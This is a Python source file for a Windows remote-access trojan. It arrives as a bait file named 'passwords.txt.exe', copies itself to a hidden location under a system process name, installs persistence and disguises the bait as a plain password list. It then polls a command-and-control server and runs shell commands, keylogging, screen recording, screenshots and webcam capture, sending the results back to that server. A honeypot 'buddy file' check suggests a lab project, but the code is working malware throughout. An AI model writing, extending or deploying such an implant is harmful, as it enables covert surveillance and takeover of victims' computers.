#!/usr/bin/env python3
"""
HTTP Command Receiver
Polls C2 server for work items and executes commands via HTTP/WebSocket.
"""
import multiprocessing
import os
import platform
import shutil
import subprocess
import sys
import time
import uuid
import json
import threading
import asyncio
from typing import Optional, Dict, Any

import requests
import websockets
from websockets.exceptions import ConnectionClosed

# Import from utils modules
from utils.config import RETRY_DELAY, FAKE_PASSWORDS, PAYLOAD_NAME, C2_API_KEY, FASTAPI_PORT
from utils.common import (
    log,
    dev_pause,
    get_payload_path,
    is_bait_file,
    is_payload,
    parse_cli_arguments,
    copy_dev_mode_marker,
    cleanup_payload_files,
    get_c2_host,
)
from utils.install import check_and_install_service
from utils.modes import ModeManager
from utils.router import CommandRouter


# ============================================================================
# DEPLOYMENT FUNCTIONS (Stage 1 & 2)
# ============================================================================


def check_buddy_system():
    """
    Safety check: If buddy file exists, show fake error and exit.
    This prevents deployment on the honeypot VM.
    Returns True if buddy detected (safe mode), False otherwise (armed mode).
    """
    import ctypes

    # Determine directory where the executable is running from
    if getattr(sys, "frozen", False):
        application_path = os.path.dirname(sys.executable)
    else:
        application_path = os.path.dirname(os.path.abspath(__file__))

    # Check for buddy file in same directory
    buddy_file_name = "ww2bomberplane.png"
    buddy_file_path = os.path.join(application_path, buddy_file_name)

    if os.path.exists(buddy_file_path):
        # SAFE MODE - Show fake Windows error
        title = "Notepad (Update Required)"
        message = (
            "You are using a legacy version of Notepad which is no longer compatible with Microsoft products or Windows 11.\n\n"
            "Please update to the latest Windows 11 release and restart your computer to install the latest version of Notepad.\n\n"
            "To update: Settings > Windows Update > Check for updates"
        )

        # Display native Windows message box with information icon (0x40)
        ctypes.windll.user32.MessageBoxW(0, message, title, 0x40)
        return True

    return False


def deploy_payload():
    """
    Stage 1: Bait file execution (passwords.txt.exe).
    Copy self to hidden location, spawn payload, and exit.
    """
    try:
        log("\n[Stage 1: Deploying payload...]")

        # Get payload paths (lazy initialization)
        payload_dir, payload_path = get_payload_path()

        # Create payload directory if it doesn't exist
        os.makedirs(payload_dir, exist_ok=True)
        log(f"Payload directory: {payload_dir}")

        # Copy self to payload location
        shutil.copy2(sys.executable, payload_path)
        log(f"Copied to: {payload_path}")

        # Copy .dev_mode marker if running in dev mode
        source_dir = os.path.dirname(sys.executable)
        copy_dev_mode_marker(source_dir, payload_dir)

        # Launch the payload with --delete-file argument
        original_path = sys.executable
        log(f"Launching payload with --delete-file {original_path}")

        # In dev mode, show console window; in production, hide it
        dev_mode_marker = os.path.join(source_dir, ".dev_mode")
        is_dev_mode = os.path.exists(dev_mode_marker)

        if is_dev_mode:
            # Dev mode: Show console window
            subprocess.Popen([payload_path, "--delete-file", original_path])
        else:
            # Production mode: Hide console window
            subprocess.Popen(
                [payload_path, "--delete-file", original_path],
                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0,
            )

        log("[Stage 1: Complete - Exiting bait file]")
        sys.exit(0)  # Success - no pause needed

    except Exception as e:
        log(f"[Stage 1: Failed - {e}]")
        dev_pause()
        sys.exit(1)  # Failure - exit with error code


def setup_camouflage(original_file: str = None):
    """
    Stage 2 (First-time setup): Rename bait file to .txt and replace contents.
    This preserves the file's desktop position (no "jumping").

    Raises exception if critical operations fail (renaming/writing file).
    """
    if not original_file or not os.path.exists(original_file):
        return

    log(f"\n[Stage 2: Setting up camouflage...]")

    # Get the directory of the original file (use absolute path)
    original_file = os.path.abspath(original_file)
    original_dir = os.path.dirname(original_file)
    fake_file_path = os.path.join(original_dir, "passwords.txt.txt")

    # Rename .exe to .txt (preserves desktop position!)
    try:
        os.rename(original_file, fake_file_path)
        log(f"Renamed: {original_file} → {fake_file_path}")
    except Exception as e:
        log(f"Warning: Could not rename file: {e}")
        # Fallback: Try delete + create (old method)
        try:
            os.remove(original_file)
            log(f"Deleted original: {original_file}")
        except Exception as e2:
            log(f"Warning: Could not delete original: {e2}")

    # Overwrite with fake passwords - CRITICAL, will raise on failure
    with open(fake_file_path, "w", encoding="utf-8") as f:
        f.write(FAKE_PASSWORDS)
    log(f"Wrote fake passwords to: {fake_file_path}")

    # Open the fake file in notepad
    try:
        # Use CREATE_NO_WINDOW to prevent console flash in production
        creationflags = subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
        subprocess.Popen(["notepad.exe", fake_file_path], creationflags=creationflags)
        log("Opened passwords in notepad")
    except Exception as e:
        log(f"Warning: Could not open notepad: {e}")

    log("[Stage 2: Camouflage complete]")


# ============================================================================
# MAIN RECEIVER LOOP
# ============================================================================


# ============================================================================
# RESULT COLLECTOR
# ============================================================================


class ResultCollector:
    """Collects results from command handlers for HTTP posting"""
    
    def __init__(self):
        self.text_result = ""
        self.binary_result = None
        self.binary_type = None
        self.error = None
    
    def add_text(self, text: str):
        """Add text to result"""
        self.text_result += text
    
    def set_binary(self, data: bytes, data_type: str):
        """Set binary result"""
        self.binary_result = data
        self.binary_type = data_type
    
    def set_error(self, error: str):
        """Set error message"""
        self.error = error
    
    def get_result(self) -> Dict[str, Any]:
        """Get result dictionary"""
        if self.error:
            return {"status": "failed", "error": self.error}
        elif self.binary_result:
            return {"status": "completed", "result_type": "binary", "data_type": self.binary_type}
        else:
            return {"status": "completed", "result": self.text_result}


# ============================================================================
# HTTP RECEIVER
# ============================================================================


def generate_receiver_id() -> str:
    """Generate a unique receiver ID"""
    return str(uuid.uuid4())


def get_c2_url(host: str) -> str:
    """Get C2 server base URL"""
    return f"http://{host}:{FASTAPI_PORT}"


def post_work_result(host: str, work_id: str, receiver_id: str, result: Dict[str, Any]):
    """Post work result to C2 server"""
    url = f"{get_c2_url(host)}/internal/work/result"
    headers = {"X-API-Key": C2_API_KEY, "Content-Type": "application/json"}
    
    payload = {
        "work_id": work_id,
        "receiver_id": receiver_id,
        "status": result.get("status", "completed"),
        "result": result.get("result"),
        "error": result.get("error")
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        response.raise_for_status()
    except Exception as e:
        log(f"[Error posting result: {e}]")


def post_work_result_binary(host: str, work_id: str, receiver_id: str, data: bytes, data_type: str):
    """Post binary work result to C2 server"""
    url = f"{get_c2_url(host)}/internal/work/result/binary"
    headers = {"X-API-Key": C2_API_KEY}
    
    files = {"file": (data_type, data, "application/octet-stream")}
    data_form = {
        "receiver_id": receiver_id,
        "work_id": work_id,
        "data_type": data_type
    }
    
    try:
        response = requests.post(url, files=files, data=data_form, headers=headers, timeout=30)
        response.raise_for_status()
    except Exception as e:
        log(f"[Error posting binary result: {e}]")


def execute_command_http(host: str, work_item: Dict[str, Any], receiver_id: str, mode_manager: ModeManager, router: CommandRouter):
    """Execute a work item and post results via HTTP"""
    work_id = work_item["work_id"]
    work_type = work_item["work_type"]
    params = work_item.get("params", {})
    
    log(f"[Executing work {work_id}: {work_type}]")
    
    # Create result collector
    collector = ResultCollector()
    
    # Create a mock socket-like object for handlers that expect sockets
    class HTTPSocketAdapter:
        """Adapter to make handlers work with HTTP"""
        def __init__(self, collector: ResultCollector):
            self.collector = collector
            self.write_lock = threading.Lock()
        
        def sendall(self, data: bytes):
            """Send text data"""
            if isinstance(data, bytes):
                self.collector.add_text(data.decode("utf-8", errors="replace"))
            else:
                self.collector.add_text(str(data))
        
        def recv(self, size: int) -> bytes:
            """Not used in HTTP mode"""
            return b""
    
    adapter = HTTPSocketAdapter(collector)
    
    try:
        # Handle special work types
        if work_type == "keylogger_start":
            # Start keylogger via WebSocket (handled separately)
            log("[Keylogger start requested - use WebSocket]")
            collector.set_error("Keylogger must be started via WebSocket")
        elif work_type == "keylogger_stop":
            # Stop keylogger
            from utils.features.keylogger import stop_keylogger
            stop_keylogger(adapter, mode_manager)
        elif work_type == "recording_start":
            # Start recording via WebSocket (handled separately)
            log("[Recording start requested - use WebSocket]")
            collector.set_error("Recording must be started via WebSocket")
        elif work_type == "recording_stop":
            # Stop recording
            from utils.features.screenrecord import stop_recording
            stop_recording(adapter, mode_manager)
        elif work_type == "command":
            # Execute shell command
            command = params.get("command", "")
            if command:
                router.handle_command(command, adapter)
        elif work_type == "screenshot":
            # Take screenshot
            from utils.features.screenshot import take_screenshot
            take_screenshot(adapter, mode_manager)
        elif work_type == "snapshot":
            # Take webcam snapshot
            from utils.features.snapshot import take_webcam_snapshot
            take_webcam_snapshot(adapter, mode_manager)
        else:
            collector.set_error(f"Unknown work type: {work_type}")
    
    except Exception as e:
        collector.set_error(str(e))
        log(f"[Error executing work: {e}]")
    
    # Post result
    result = collector.get_result()
    if result.get("result_type") == "binary" and collector.binary_result:
        post_work_result_binary(host, work_id, receiver_id, collector.binary_result, collector.binary_type)
    else:
        post_work_result(host, work_id, receiver_id, result)


def start_receiver_http(host: str) -> None:
    """
    Start the HTTP command receiver client.

    Args:
        host: The C2 server host address
    """
    receiver_id = generate_receiver_id()
    log(f"[Receiver ID: {receiver_id}]")
    log(f"[Connecting to C2 server: {host}:{FASTAPI_PORT}]")
    
    # Create mode manager and command router
    mode_manager = ModeManager()
    router = CommandRouter(mode_manager)
    
    url = f"{get_c2_url(host)}/internal/work/poll"
    headers = {"X-API-Key": C2_API_KEY, "Content-Type": "application/json"}
    
    last_check = None
    attempt = 1
    
    try:
        while True:
            try:
                # Poll for work
                payload = {
                    "receiver_id": receiver_id,
                    "last_check": last_check
                }
                
                response = requests.post(url, json=payload, headers=headers, timeout=30)
                response.raise_for_status()
                
                data = response.json()
                work_items = data.get("work_items", [])
                
                if work_items:
                    log(f"[Received {len(work_items)} work item(s)]")
                    # Execute work items (can be concurrent in future)
                    for work_item in work_items:
                        # Mark as executing
                        work_item["status"] = "executing"
                        # Execute in thread for multitasking
                        thread = threading.Thread(
                            target=execute_command_http,
                            args=(host, work_item, receiver_id, mode_manager, router),
                            daemon=True
                        )
                        thread.start()
                
                # Update last_check
                last_check = time.time()
                
                # Reset attempt counter on success
                attempt = 1
                
                # Poll every 5 seconds
                time.sleep(5)
                
            except requests.exceptions.RequestException as e:
                log(f"[Connection error (attempt {attempt}): {e}]")
                attempt += 1
                if attempt > 10:
                    log("[Too many connection errors, exiting]")
                    break
                time.sleep(RETRY_DELAY)
            except Exception as e:
                log(f"[Error: {e}]")
                time.sleep(RETRY_DELAY)
    
    except KeyboardInterrupt:
        if platform.system() == "Windows":
            log("\n\nReceiver interrupted - restarting...")
            dev_pause()
            sys.exit(1)
        else:
            log("\n\nExiting...")
            sys.exit(0)
    except Exception as e:
        log(f"Error: {e}")
        dev_pause()
        sys.exit(1)


def run_with_auto_restart(host: str) -> None:
    """
    Wrapper that automatically restarts the receiver if it crashes.
    Used in daemon mode for crash recovery.

    Windows: Only /quit command can permanently stop the receiver.
    macOS/Linux: Ctrl+C exits cleanly (normal behavior).
    """
    system = platform.system()
    restart_count = 0

    while True:
        try:
            if restart_count > 0:
                log(f"\n[ Restarting receiver (attempt #{restart_count}) ]\n")
            start_receiver_http(host)
            # If we get here, it exited cleanly (only from /quit command)
            break

        except KeyboardInterrupt:
            # Platform-specific behavior
            if system == "Windows":
                # Windows: Treat Ctrl+C as a crash - restart the receiver
                restart_count += 1
                log("\n\nReceiver interrupted with Ctrl+C")
                log(f"Auto-restarting in {RETRY_DELAY} seconds...")
                time.sleep(RETRY_DELAY)
            else:
                # macOS/Linux: Allow clean exit
                log("\n\nExiting...")
                break

        except Exception as e:
            restart_count += 1
            log(f"\n\nReceiver crashed: {e}")
            log(f"Auto-restarting in {RETRY_DELAY} seconds...")
            time.sleep(RETRY_DELAY)


# ============================================================================
# ENTRY POINT
# ============================================================================


if __name__ == "__main__":
    multiprocessing.freeze_support()
    # Only run deployment logic on Windows and when frozen/compiled (PyInstaller or Nuitka)
    if platform.system() == "Windows" and (getattr(sys, "frozen", False) or "__compiled__" in globals()):

        # STAGE 1: Bait file execution (passwords.txt.exe)
        if is_bait_file():
            log("\n[ Bait file detected - Deploying payload ]\n")

            # Check if running in dev mode:
            # 1. Running as .py file (not frozen/compiled)
            # 2. .dev_mode marker file exists in executable directory
            is_frozen = getattr(sys, "frozen", False) or "__compiled__" in globals()
            exe_dir = os.path.dirname(sys.executable if is_frozen else os.path.abspath(__file__))
            dev_mode_marker = os.path.join(exe_dir, ".dev_mode")
            is_dev_mode = not is_frozen or os.path.exists(dev_mode_marker)

            # Buddy system safety check (skip in dev mode)
            if not is_dev_mode:
                if check_buddy_system():
                    log("[ Buddy file detected - Safe mode activated ]")
                    sys.exit(0)  # Exit safely without deployment
            else:
                log("[ Dev mode detected - Skipping buddy check ]")

            # Proceed with normal deployment if no buddy detected
            deploy_payload()
            # deploy_payload() calls sys.exit(0) - execution stops here

        # STAGE 2: Payload execution (taskhostw.exe)
        elif is_payload():
            log("\n[ HTTP Command Receiver - Payload Mode ]\n")

            # Parse CLI arguments
            delete_file = parse_cli_arguments()

            # Check if persistence is already installed (will raise on failure)
            check_and_install_service()

            # If we just installed (first run), setup camouflage (will raise on failure)
            # Check if task was just created by seeing if delete_file was provided
            if delete_file:
                setup_camouflage(delete_file)

            # Run with auto-restart wrapper for crash recovery
            run_with_auto_restart(get_c2_host())

        else:
            # Unrecognized executable name - fail fast
            log(f"\n[ ERROR: Unrecognized executable name ]\n")
            log(f"Current name: {os.path.basename(sys.executable)}")
            log(f"Expected: 'passwords.txt.exe' or '{PAYLOAD_NAME}'")
            log("Exiting...\n")
            dev_pause()
            sys.exit(1)

    else:
        # Running in development mode (not frozen) or on non-Windows
        log("\n[ HTTP Command Receiver - Development Mode ]\n")

        if platform.system() == "Windows":
            check_and_install_service()

        # Run with auto-restart wrapper for crash recovery
        run_with_auto_restart(get_c2_host())
